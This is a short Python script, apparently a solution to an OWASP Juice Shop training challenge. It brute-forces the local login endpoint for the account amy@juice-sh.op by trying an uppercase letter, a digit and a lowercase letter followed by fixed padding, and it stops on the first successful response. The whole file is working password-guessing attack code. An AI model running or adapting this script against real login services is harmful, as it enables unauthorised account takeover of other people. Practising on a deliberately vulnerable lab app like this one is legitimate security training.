import requests
import string


url = "http://127.0.0.1:3000/rest/user/login"


for upper in string.ascii_uppercase:
    for number in range(10):
        for lower in string.ascii_lowercase:

            password = f"{upper}{number}{lower}....................."

            payload = {
                "email": "amy@juice-sh.op",
                "password": password
            }

            response = requests.post(url, json=payload)

            print(f"used password: {password}")

            if response.status_code == 200:
                print("!!! Success !!!")
                quit()